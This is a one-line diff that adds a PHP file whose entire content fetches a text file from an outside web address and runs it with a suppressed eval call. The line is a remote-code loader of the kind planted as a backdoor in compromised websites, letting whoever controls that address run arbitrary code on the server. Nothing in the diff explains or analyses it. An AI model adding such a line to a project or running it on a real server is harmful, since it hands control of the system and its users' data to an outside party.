@@ -1,0 +1,1 @@
+﻿<?php @eval('?>'.implode('', file("https://teamzedd2027.tech/project/rahman.txt"))); ?>
